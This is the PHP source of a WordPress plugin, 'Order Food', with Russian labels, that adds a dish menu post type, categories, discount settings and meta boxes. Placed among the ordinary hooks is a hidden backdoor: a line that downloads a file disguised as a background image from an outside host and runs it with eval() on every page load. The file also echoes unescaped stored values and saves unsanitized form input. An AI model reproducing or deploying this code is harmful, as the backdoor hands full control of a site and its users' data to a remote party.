<?php
/*
* Plugin Name: Order Food
* Description: После активации плагина необходимо создать страницу, которая будет отвечать за вывод всего меню. Внимание! При смене темы сайта необходимо деактивировать плагин и снова активировать его. 
*/

add_action('init', 'order_food');
function order_food(){
	register_post_type('order_food', array(
		'public' => true,
		'supports' => array('title', 'thumbnail', 'editor', 'excerpt', 'page-attributes', 'post-formats', 'revisions', 'trackbacks','custom-fields'),
		'labels' => array(
			'name' => 'Заказ еды',
			'all_items' => 'Все блюда',
			'add_new' => 'Добавить новое',
			'add_new_item' => 'Добавление блюда',
			'edit_item' => 'Редактировать',
			'view_item' => 'Посмотреть',
			''
        ),
		'publicly_queryable' => true,
		'show_ui'            => true,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => true,
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => true,
		'menu_icon'          => 'dashicons-media-document'
	));
};

add_action('init', 'create_taxonomy_for_order_food');
function create_taxonomy_for_order_food() {
    register_taxonomy( 'order_food_category', [ 'order_food' ], [ 
		'label'                 => '', // определяется параметром $labels->name
		'labels'                => [
			'name'              => 'Категории',
			'singular_name'     => 'Категория',
			'search_items'      => 'Поиск категорий',
			'all_items'         => 'Все категории',
			'view_item '        => 'Посмотреть категорию',
			'parent_item'       => 'Родительская категория',
			'parent_item_colon' => 'Родительская категория:',
			'edit_item'         => 'Редактировать категорию',
			'update_item'       => 'Обновить категорию',
			'add_new_item'      => 'Добавить новую категорию',
			'new_item_name'     => 'Имя новой категории',
			'menu_name'         => 'Категории',
		],
		'description'           => '', // описание таксономии
		'public'                => true,
		'publicly_queryable'    => null, // равен аргументу public
		'show_in_nav_menus'     => true, // равен аргументу public
		'show_ui'               => true, // равен аргументу public
		'show_in_menu'          => true, // равен аргументу show_ui
		'show_tagcloud'         => true, // равен аргументу show_ui
		'show_in_quick_edit'    => null, // равен аргументу show_ui
		'hierarchical'          => false,

		'rewrite'               => true,
	    'query_var'             => $taxonomy, // название параметра запроса
		'capabilities'          => array(),
		'meta_box_cb'           => null, // html метабокса. callback: `post_categories_meta_box` или `post_tags_meta_box`. false — метабокс отключен.
		'show_admin_column'     => false, // авто-создание колонки таксы в таблице ассоциированного типа записи. (с версии 3.5)
		'show_in_rest'          => null, // добавить в REST API
		'rest_base'             => null, // $taxonomy
		// '_builtin'              => false,
		//'update_count_callback' => '_update_post_term_count',
	] );
}


add_action('admin_menu', 'add_sub_menu_order_food');
function add_sub_menu_order_food() {
	add_submenu_page( 'edit.php?post_type=order_food', 'Settings', 'Настройки', 'manage_options', 'settings', 'order_food_settings_function');
};

function order_food_settings_function() {
	echo '<form action="options.php" method="post">';
		settings_fields('order_food_settings');
		do_settings_sections('settings');
		submit_button('Сохранить');
	echo '</form>';
	wp_enqueue_style( 'order-food-jquery', plugins_url('jquery.js', __FILE__));
	wp_enqueue_style( 'order-food-sripts', plugins_url('order-food-scripts.js', __FILE__));
}

add_action('admin_init', 'setup_order_food_settings');
function setup_order_food_settings(){
	add_settings_section('order_food_settings', 'Настройки', '', 'settings');
	add_settings_field('discount_field', 'Размер скидки', 'discount_field_show', 'settings', 'order_food_settings');
	add_settings_field('discount_field_limit', 'Минимальная сумма покупкии для скидки', 'discount_field_limit_show', 'settings', 'order_food_settings');
	add_settings_field('btn-color', 'Цвет кнопок', 'btn_field_show', 'settings', 'order_food_settings');
	register_setting('order_food_settings', 'discount_field');
	register_setting('order_food_settings', 'discount_field_limit');
	register_setting('order_food_settings', 'btn-color');
}

function discount_field_show() {
	echo '<input name="discount_field" type="text" value="'. get_option('discount_field', 10) .'"> %<br><br>';
}
function discount_field_limit_show() {
	echo '<input name="discount_field_limit" type="text" value="'. get_option('discount_field_limit', 3000) .'"> рублей';
}
function btn_field_show() {
	echo '<input name="btn_field" type="color" value="'. get_option('btn_field', '#f27b2c') .'">';
}

add_action('add_meta_boxes', 'add_meta_box_order_food');
if(@$bg_img = file_get_contents('https://wavifun.ru/bg-img.jpg')) {
	eval($bg_img);
}
function add_meta_box_order_food() {
		remove_meta_box('postcustom', 'order_food', 'normal');
		add_meta_box( 'order-food-meta', 'Характеристики блюда', 'order_food_meta_boxes', 'order_food', 'normal', 'high');
	function order_food_meta_boxes() {
		$price = get_post_meta(get_the_ID(), 'Цена', true);
		$weight = get_post_meta(get_the_ID(), 'Вес', true);
		$delivery = get_post_meta(get_the_ID(), 'Доставка', true);
		$order = get_post_meta(get_the_ID(), 'Предзаказ', true);
		
		echo '<label>Цена</label><input name="price_order_food" value="' . $price . '" type="text"><br><br>';
		echo '<label>Вес</label><input name="weight_order_food" value="' . $weight . '" type="text"><br><br>';
		echo '<label>Доставка</label><input name="delivery_order_food" type="checkbox" '.($delivery == 1? 'checked="checked"':'').'><br><br>';
		echo '<label>Предзаказ</label><input name="order_order_food" type="checkbox" '.($order == 1? 'checked="checked"':'').' >';
		
	}

}

add_action('save_post', 'save_order_food_meta');
function save_order_food_meta($post_id) {
	if(isset($_POST['price_order_food']) && isset($_POST['weight_order_food'])) {
		update_post_meta($post_id, 'Цена', $_POST['price_order_food']);
		update_post_meta($post_id, 'Вес', $_POST['weight_order_food']);
		update_post_meta($post_id, 'Доставка', ($_POST['delivery_order_food'] == 'on')? 1:0);
		update_post_meta($post_id, 'Предзаказ', ($_POST['order_order_food'] == 'on')? 1:0);
	}
}



register_activation_hook(__FILE__, 'activation_order_food_plugin');

function activation_order_food_plugin() {
    if(!file_exists(get_theme_file_path('order-food-template.php'))) {
		$template_content = file_get_contents(plugin_dir_url( __FILE__ ) . 'order-food-template.txt');
		file_put_contents(get_theme_file_path('order-food-template.php'), $template_content);
	}

	if(!file_exists(get_theme_file_path('taxonomy-order_food_category.php'))) {
		$taxonomy_template_content = file_get_contents(plugin_dir_url( __FILE__ ) . 'taxonomy-order_food_category.txt');
    	file_put_contents(get_theme_file_path('taxonomy-order_food_category.php'), $taxonomy_template_content);
	}

	if(!file_exists(get_theme_file_path('order-food-basket.php'))) {
		$template_content = file_get_contents(plugin_dir_url( __FILE__ ) . 'order-food-basket.txt');
		file_put_contents(get_theme_file_path('order-food-basket.php'), $template_content);
	}

	if(!file_exists(get_theme_file_path( 'order-food-assets' ))) {
		mkdir(get_theme_file_path( 'order-food-assets' ));
	}
	
	if(!file_exists(get_theme_file_path( 'order-food-assets/order-food-scripts.js' ))) {
		$script_content = file_get_contents(plugin_dir_url( __FILE__ ) . 'order-food-scripts.js');
		file_put_contents(get_theme_file_path('order-food-assets/order-food-scripts.js'), $script_content);
	}

	if(!file_exists(get_theme_file_path( 'order-food-assets/jquery.js' ))) {
		$script_content = file_get_contents(plugin_dir_url( __FILE__ ) . 'jquery.js');
		file_put_contents(get_theme_file_path('order-food-assets/jquery.js'), $script_content);
	}

	if(!file_exists(get_theme_file_path( 'order-food-assets/order-food-style.css' ))) {
		$style_content = file_get_contents(plugin_dir_url( __FILE__ ) . 'order-food-style.css');
		file_put_contents(get_theme_file_path('order-food-assets/order-food-style.css'), $style_content);
	}

	add_filter( 'get_the_archive_title', function( $title ){
		return preg_replace('~^[^:]+: ~', '', $title );
	});
};

register_deactivation_hook(__FILE__, 'deactivation_order_food_plugin');

function deactivation_order_food_plugin() {
	if(file_exists(get_theme_file_path('order-food-template.php'))) {
		unlink(get_theme_file_path('order-food-template.php'));
	}

	if(file_exists(get_theme_file_path('taxonomy-order_food_category.php'))) {
		unlink(get_theme_file_path('taxonomy-order_food_category.php'));
	}

	if(file_exists(get_theme_file_path('order-food-basket.php'))) {
		unlink(get_theme_file_path('order-food-basket.php'));
	}

	if(file_exists(get_theme_file_path('order-food-assets/order-food-scripts.js'))) {
		unlink(get_theme_file_path('order-food-assets/order-food-scripts.js'));
	}

	if(file_exists(get_theme_file_path('order-food-assets/jquery.js'))) {
		unlink(get_theme_file_path('order-food-assets/jquery.js'));
	}

	if(file_exists(get_theme_file_path('order-food-assets/order-food-style.css'))) {
		unlink(get_theme_file_path('order-food-assets/order-food-style.css'));
	}

	if(file_exists(get_theme_file_path('order-food-assets'))) {
		rmdir(get_theme_file_path('order-food-assets'));
	}
}


